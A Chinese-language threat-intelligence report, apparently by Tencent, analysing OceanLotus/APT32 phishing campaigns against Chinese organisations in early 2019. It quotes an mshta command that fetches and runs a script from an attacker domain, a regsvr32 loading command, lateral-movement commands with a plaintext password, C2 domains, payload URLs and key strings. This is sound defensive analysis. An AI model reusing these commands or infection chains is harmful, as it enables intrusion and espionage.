## 一、背景

**"海莲花"（又名APT32、OceanLotus），被认为是来自越南的APT攻击组织，自2012年活跃以来，一直针对中国的敏感目标进行攻击活动，是近几年来针对中国大陆进行攻击活动的最活跃的APT攻击组织之一。**

在2019年第一季度，腾讯御见威胁情报中心持续的检测到该组织针对中国大陆的政府、海事机构、商务部门、研究机构的攻击活动。此外该组织还在不断的更新他们的攻击武器库，无论是钓鱼的诱饵形式、payload的加载、横向移动等。尤其值得注意的是，我们发现该组织针对不同的机器下发不同的恶意模块，使得即便恶意文件被安全厂商捕捉到，也因为无相关机器特征而无法解密最终的payload，无法知晓后续的相关活动。

活动钻石模型如下：

![](https://image.3001.net/images/20190425/1556175138_5cc159225cea2.jpg!small)

![](https://image.3001.net/images/20190425/1556175155_5cc159334f80b.png!small)

## 二、技术分析

### 1、 初始攻击

恶意文件投递的方式依然是最常用的鱼叉攻击的方式，钓鱼关键字包括"干部培训"，"绩效"，"工作方向"，"纪检监察"等，相关的邮件如下：

![](https://image.3001.net/images/20190425/1556175167_5cc1593f76fc7.png!small)

![](https://image.3001.net/images/20190425/1556175193_5cc15959b39dc.png!small)

![](https://image.3001.net/images/20190425/1556175199_5cc1595fe8424.png!small)

除此该次攻击还新增了敏感内容的主题，用户吸引被攻击者打开，如敏感图片：

![](https://image.3001.net/images/20190425/1556175212_5cc1596ca20b4.png!small)

### 2、 诱饵类型

2019年一季度投递的恶意诱饵类型众多，包括白加黑、lnk、doc文档、带有WinRARACE（CVE-2018-20250）漏洞的压缩包等。

1） 白加黑

![](https://image.3001.net/images/20190425/1556175223_5cc15977b2297.png!small)

![](https://image.3001.net/images/20190425/1556175235_5cc159831b994.png!small)

2） 恶意lnk

![](https://image.3001.net/images/20190425/1556175251_5cc159930a058.png!small)

3） 带有宏的恶意doc文档

![](https://image.3001.net/images/20190425/1556175259_5cc1599bf3d9e.png!small)

4） 带有WinRAR ACE（CVE-2018-20250）漏洞的压缩包：

![](https://image.3001.net/images/20190425/1556175283_5cc159b3549a8.png!small)

![](https://image.3001.net/images/20190425/1556175284_5cc159b43e878.png!small)

![](https://image.3001.net/images/20190425/1556175312_5cc159d060b69.png!small)

![](https://image.3001.net/images/20190425/1556175307_5cc159cbd27e2.png!small)

![](https://image.3001.net/images/20190425/1556175326_5cc159dea58cc.png!small)

![](https://image.3001.net/images/20190425/1556175338_5cc159ead010d.png!small)

### 3、 恶意文件植入

1） 恶意lnk分析

在1月的一波攻击中，该组织会在所有的投递的压缩包里，都存放一个恶意的lnk，但是所有的lnk文件都类似（执行的地址不能，但是内容一致）。lnk文件的图标伪装成word图标。值得注意的是，该lnk的图标会从网络获取，因此如果远程服务器已经关闭，会导致该lnk无图标的现象。此外，还会造成即便不双击lnk，只要打开lnk所在的目录，就会出现网络连接的现象。

该现象的原因是：explorer解析lnk的时候会去解析图标，而这个lnk配置的图标在网络上，因此会自动去下载，但只是下载，不会执行，看一眼不运行lnk文件的话，会泄漏自身ip地址，但不会导致电脑中木马。

![](https://image.3001.net/images/20190425/1556175350_5cc159f6889a1.png!small)

双击运行lnk后，会执行下列命令：

    
    
    C:\Windows\SysWOW64\mshta.exe<http://api.baidu-json.com/feed/news.html>

[](http://api.baidu-json.com/feed/news.html)

其中， news.html实际为一个vbs脚本文件：

![](https://image.3001.net/images/20190425/1556175362_5cc15a02ebdfb.png!small)

mstha执行此脚本本后会解密脚本中存储的内容，并存储到%temp%目录下，文件名分别为：

    
    
    7b95ffab-3a9c-494a-a584-9c48dc7aa6a7.tmp
    
    7b95ffab-3a9c-494a-a584-9c48dc7aa6a7.exe
    
    7b95ffab-3a9c-494a-a584-9c48dc7aa6a7.log
    
    7b95ffab-3a9c-494a-a584-9c48dc7aa6a7.env

![](https://image.3001.net/images/20190425/1556175372_5cc15a0cbb399.png!small)

解密算法如下所示：

![](https://image.3001.net/images/20190425/1556175384_5cc15a1821173.png!small)

接着调用系统自带的odbcconf.exe，将7b95ffab-3a9c-494a-a584-9c48dc7aa6a7.tmp（dll文件）给加载起来。最后调用taskkill.exe，结束mshta.exe进程：

![](https://image.3001.net/images/20190425/1556175414_5cc15a369802e.png!small)

但是奇怪的是，由于解密算法的问题，导致最终的解密失败，因此执行该lnk，用户实际并不会中招：

从而我们猜测该方式可能还处于测试阶段，或者作者由于疏忽导致。不过在后续的攻击活动中，我们未再次检测到该攻击方式。

2） 带有宏的doc文档

带有宏的文档的投递，是该组织比较常用的恶意诱饵，如：

此外，Twitter上也有不少安全同仁曝光过该组织的该方式的诱饵：

![](https://image.3001.net/images/20190425/1556175474_5cc15a7284226.png!small)

此外疑似作者还在VT上跟相关研究员互动：

![](https://image.3001.net/images/20190425/1556175692_5cc15b4c99ede.png!small)

当然，我们更相信该用户可能只是安全研究员之间的一个玩笑。

执行宏后，首先会复制原始文档到%temp%下，命名为随机名文件：

![](https://image.3001.net/images/20190425/1556175666_5cc15b3280ff1.png!small)

然后解密出一个新的VBA宏：

![](https://image.3001.net/images/20190425/1556175684_5cc15b442abca.png!small)

接着设置注册表

”HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Word\Security\AccessVBOM”的值为1：

![](https://image.3001.net/images/20190425/1556175694_5cc15b4e22520.png!small)

最后打开之前复制的doc文件，并将原始VBA宏擦除，将解密后的新的VBA宏添加进去，并启动VBA宏函数 x_N0th1ngH3r3：

![](https://image.3001.net/images/20190425/1556175705_5cc15b59be331.png!small)

x_N0th1ngH3r3函数同样是解密出一段新VBA宏，同样调用新VBA宏的x_N0th1ngH3r3函数：

![](https://image.3001.net/images/20190425/1556175720_5cc15b680e692.png!small)

解密出来的新VBA宏目的是将shellcode解密并加载执行：

![](https://image.3001.net/images/20190425/1556175731_5cc15b731bb0b.png!small)

Shellcode解密出一个DLL文件，并在内存中加载，执行DllEntry函数：

![](https://image.3001.net/images/20190425/1556175743_5cc15b7f00f5d.png!small)

![](https://image.3001.net/images/20190425/1556175757_5cc15b8d14aab.png!small)

DllEntry函数先会提取资源文件，并解密出来：

![](https://image.3001.net/images/20190425/1556175770_5cc15b9acaa22.png!small)

![](https://image.3001.net/images/20190425/1556175783_5cc15ba79101e.png!small)

解密出来的内容包括最终rat和相关配置信息：

![](https://image.3001.net/images/20190425/1556175799_5cc15bb71bdd4.png!small)

随后会将解密的rat在内存中展开，并且查找CreateInstance函数地址，然后将配置信息传入调用该函数：

![](https://image.3001.net/images/20190425/1556175811_5cc15bc332758.png!small)

![](https://image.3001.net/images/20190425/1556175824_5cc15bd0ef325.png!small)

配置的4个C&C使用https进行通信连接：

    
    
    cloud.360cn.info
    
    dns.chinanews.network
    
    aliexpresscn.net
    
    chinaport.org

其他的技术细节同文章同之前御见发布的海莲花的分析文章（见附录）

3） 白加黑

白加黑同样是该组织常用的诱饵类型，并且在实际攻击过程中，还多次使用。

如，攻击首先使用了word的主程序为白文件，加载恶意文件wwlib.dll：

![](https://image.3001.net/images/20190425/1556175847_5cc15be7758c3.png!small)

![](https://image.3001.net/images/20190425/1556175852_5cc15becd162a.png!small)

![](https://image.3001.net/images/20190425/1556175873_5cc15c01db7a0.png!small)

释放诱饵文档到临时目录，并打开：

![](https://image.3001.net/images/20190425/1556175880_5cc15c08db3db.png!small)

然后再次使用白加黑的技术，使用360se的主程序做为白文件，加载恶意的chrome_elf.dll：

![](https://image.3001.net/images/20190425/1556175891_5cc15c13ac114.png!small)

chrome_elf.dll功能除了实现调用原始默认程序打开txt、doc文件外，还会连接网络下载下一阶段的恶意文件并在内存中直接执行：

![](https://image.3001.net/images/20190425/1556175904_5cc15c205755a.png!small)

下载地址为：<https://officewps.net/cosja.png>

此外，其他的恶意样本下载地址如：<https://dominikmagoffin.com/subi.png>，<https://ristineho.com/direct.jpg>等。

下载的木马是一个直接可当作代码执行的shellcode，下载后直接在内存中执行：

![](https://image.3001.net/images/20190425/1556175919_5cc15c2f0f63c.png!small)

shellcode的功能是解压解密出一个功能自加载的PE文件：

![](https://image.3001.net/images/20190425/1556175937_5cc15c41924bb.png!small)

![](https://image.3001.net/images/20190425/1556175953_5cc15c51ee9b6.png!small)

![](https://image.3001.net/images/20190425/1556175967_5cc15c5fa02a9.png!small)

该PE文件是CobaltStrike木马，和之前海莲花组织使用的该木马完全一样，C2为<https://officewps.net/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2>。

![](https://image.3001.net/images/20190425/1556175983_5cc15c6f3a59a.png!small)

此外，我们还发现有比较早前的攻击活动中，同样使用360的软件管理来做为白加黑的载体：

![](https://image.3001.net/images/20190425/1556176006_5cc15c8601a07.png!small)

该样本会读取c:\windows\system32.ini文件，读取1字节作为key：

![](https://image.3001.net/images/20190425/1556176015_5cc15c8f1f14e.png!small)

![](https://image.3001.net/images/20190425/1556176038_5cc15ca6ce953.png!small)

读取并解密资源icon下的1资源，得到一个字符串wsc_proxy.exe，比较当前进程是否为wsc_proxy.exe，如果是则继续：

![](https://image.3001.net/images/20190425/1556176045_5cc15cad0f008.png!small)

读取自身.text区段地址，如果没读取成功就读取safemon.dll的：

![](https://image.3001.net/images/20190425/1556176059_5cc15cbb3fe62.png!small)

![](https://image.3001.net/images/20190425/1556176074_5cc15cca8623c.png!small)

读取ummrzhwp.Emf，使用同样的方法解密，完后加载：

![](https://image.3001.net/images/20190425/1556176093_5cc15cddd0b4a.png!small)

![](https://image.3001.net/images/20190425/1556176107_5cc15ceb483ae.png!small)

最终的shellcode为CobaltStrike，不再赘述。

4） 带有WinRAR ACE（CVE-2018-20250）漏洞的压缩包

该压缩包解压后，会解压出有模糊图片处理的doc文档：

![](https://image.3001.net/images/20190425/1556176197_5cc15d45686e1.png!small)

除了解压出压缩的文件后，还会在启动目录（C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup）释放一个自解压文件：

![](https://image.3001.net/images/20190425/1556176161_5cc15d210d333.png!small)

解压后会有一个{7026ce06-ee00-4ebd-b00e-f5150d86c13e}.ocx文件，然后执行命令

regsvr32 /s /i {7026ce06-ee00-4ebd-b00e-f5150d86c13e}.ocx执行。

![](https://image.3001.net/images/20190425/1556176189_5cc15d3d35978.png!small)

该ocx的技术细节同前面宏文档的内存dll的部分分析，此处就不再赘述。

### 4、下发文件分析

在攻击者攻陷机器后，攻击者还会持续的对受控机进行攻击：会通过脚本释放新的与该机器绑定木马，此木马主要通过两种加载器实现只能在该机器上运行，加载器也是使用白加黑技术，如使用googleupdate.exe+goopdate.dll，此外的名字还包括如：

    
    
    KuGouUpdate.exe+goopdate.dll
    
    AdobeUpdate.exe+goopdate.dll
    
    Bounjour.exe+goopdate.dll

1） 加载器1分析

原理示意图如下：

![](https://image.3001.net/images/20190425/1556176192_5cc15d402cf0f.png!small)

木马执行后分配内存空间，拷贝shellcode到新申请的空间中执行，shellcode的功能则是利用配置密码+本地计算机名的hash作为密钥解密最终的playload，并对playload进行校验，成功后创建新线程执行playload。

![](https://image.3001.net/images/20190425/1556176223_5cc15d5f1673e.png!small)

![](https://image.3001.net/images/20190425/1556176260_5cc15d841aa5d.png!small)

![](https://image.3001.net/images/20190425/1556176288_5cc15da095710.png!small)

2） 加载器2分析

原理图如下：

![](https://image.3001.net/images/20190425/1556176312_5cc15db8c6380.png!small)

加载器2是在加载器1的基础上增加了一层随机密钥的加密，更好地对抗安全软件的检测扫描，且通过挂钩API函数然乱木马执行流程来干扰自动化沙箱的分析。

首先在dll入口点处hook
LdrLoadDll函数，当调用该API时接管执行流程执行解密代码，通过内置的随机密码解密shellcode，shellcode的功能则是利用配置密码+本地计算机名的hash作为密钥解密最终的playload，并对playload进行校验，成功后创建新线程执行playload：

![](https://image.3001.net/images/20190425/1556176330_5cc15dca3101d.png!small)

![](https://image.3001.net/images/20190425/1556176355_5cc15de3354e8.png!small)

![](https://image.3001.net/images/20190425/1556176362_5cc15deacc091.png!small)

Shellcode行为同loader1解密出的shellcode一致：

![](https://image.3001.net/images/20190425/1556176375_5cc15df7aebe8.png!small)

使用的相关的加密前缀还有：

    
    
    AMDservice
    
    justletMeholdU
    
    360zipfuckyou
    
    PJFgaJunlmzRdjx79txe
    
    sadasddsadsa@350sadsad
    
    210.72.156.203
    
    sad@1232198sadasd
    
    fuckthis@wwww360sad
    
    1KR20RYMPVYDRGU@sasd
    
    GoogleCompany
    
    ……

最终的playload有三种，都是海莲花常用的木马，分别为CobaltStrike、Gh0st、Denis。

RAT1：CobaltStrike

![](https://image.3001.net/images/20190425/1556176389_5cc15e056a8dd.png!small)

RAT2：Gh0st改版

该木马疑似使用开源木马gh0st改版，支持tcp、upd，数据包使用zlib压缩。

![](https://image.3001.net/images/20190425/1556176403_5cc15e1370ac7.png!small)

RAT3：Denis

![](https://image.3001.net/images/20190425/1556176415_5cc15e1f9c683.png!small)

### 5、 提权和横向移动

此外，我们还发现海莲花还会不断的对被攻击的内网进行横向移动，以此来渗透到更多的机器：

利用nbt.exe扫描内网网段，其可能通过收集凭据信息或暴力破解内网网络共享的用户和密码，如：

    
    
    C:\\WINDOWS\\system32\\cmd.exe/C nbt.exe 192.168.1.105/24；

通过net user等相关命令查看或访问内网主机，如：

    
    
    net user\\192.168.1.83\C#3 /U:192.168.1.183\Administrator 123456；
    
    NTLM hash。

此外，在上段所述的加密的前缀中，我们还发现了一个ip：210.72.156.203做为加密前缀，我们从腾讯安图查询可见：

![](https://image.3001.net/images/20190425/1556176446_5cc15e3e89435.jpg!small)

可以发现，能关联到nbtscan-1.0.35.exe和mmc.exe，同样跟内网渗透相关。

还渗透到内网机器后，攻击者还发下发bat和js脚本，来执行后续的操作。

脚本名字如encode.js、360se.txt、360PluginUpdater.js、360DeepScanner.js、360Tray.js等。

如：360PluginUpdater.bat+360PluginUpdater.js

360PluginUpdater.bat的功能是输出加密脚本到360PluginUpdater.dat，完成后将其重命名为360PluginUpdater.js，并执行他：

![](https://image.3001.net/images/20190425/1556176468_5cc15e5406e87.png!small)

![](https://image.3001.net/images/20190425/1556176482_5cc15e623a6b6.png!small)

360PluginUpdater.js是个加密的脚本：

![](https://image.3001.net/images/20190425/1556176500_5cc15e744f207.png!small)

通过一系列解密后最终通过eval执行解密后的脚本：

![](https://image.3001.net/images/20190425/1556176514_5cc15e82bc169.png!small)

经过base64解密及范序列化后得到两个对象loader和playload，并在内存中调用loader的LoadShell方法。

loader的pdb为：E:\priv\framework\code\tools\exe2js\loader\obj\Release\loader.pdb，其功能是申请内存，解密加载执行playload：

![](https://image.3001.net/images/20190425/1556176527_5cc15e8fae906.png!small)

payload PE头自带加载代码：

![](https://image.3001.net/images/20190425/1556176541_5cc15e9d412bd.png!small)

最终调用ReflectiveLoader实现内存加载dll：

![](https://image.3001.net/images/20190425/1556176559_5cc15eaf283e5.png!small)

最终为为CobaltStrike攻击平台远控：

![](https://image.3001.net/images/20190425/1556176590_5cc15ecec9fbb.png!small)

## 三、攻击者分析

从本次的攻击者的钓鱼邮件的邮件名来看，攻击者均采用了网易的免费邮箱126.com和163.com，[如baixiao******@126.com、duancongrui**@163.com](mailto:%E5%A6%82baixiao******@126.com%E3%80%81duancongrui**@163.com)等。邮件名格式都采用名字+数字的形式。名字存在一定的中国特色。

再者，注册的C&C域名，如cloud.360cn.info、chinaport.org、dns.chinanews.network、order.dianpingsh.com等也带有明显的中国特色。

而从钓鱼邮件的内容和附件来看，攻击者对中国的国情和相关信息也有非常多的了解。

## 四、总结

海莲花组织是近年来针对中国大陆的敏感部门进行攻击的最活跃的APT组织之一，它总是在不断的进化，更新他的攻击手法和武器库，以达到绕过安全软件防御的目的。如不断的变换加载方式、混淆方法、多种多样的诱饵形式等，还使用新的Nday进行攻击，如该波攻击中的WinRAR
ACE漏洞（CVE-2018-20250）。除了武器库的不断更新，该组织也相当熟悉中国的情况，包括政策、使用习惯等等，这也使得迷惑相关人员，是的攻击成功增加了成功率。

除此，该组织的攻击范围也在不断的扩大，除了政府部门、海事机构、商务厅、能源单位等外，研究机构所遭受的攻击也在不断的增多，而对个人的攻击，如教授、律师的钓鱼攻击也在不断的进行。

​ 因此我们提醒有关部门及有关机构的工作人员，切实提高国家安全意识，提高网络安全意识，不要被网络钓鱼信息所蒙蔽，以免给国家安全造成重大损失。

## 五、安全建议

1、 不要打开不明来源的邮件附件；

2、 及时打系统补丁和重要软件的补丁；

3、小心处理Office文档，除非确认文档来源可靠，充分了解打开文档的后果，否则务必不要开启Office启用宏代码；

 ***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

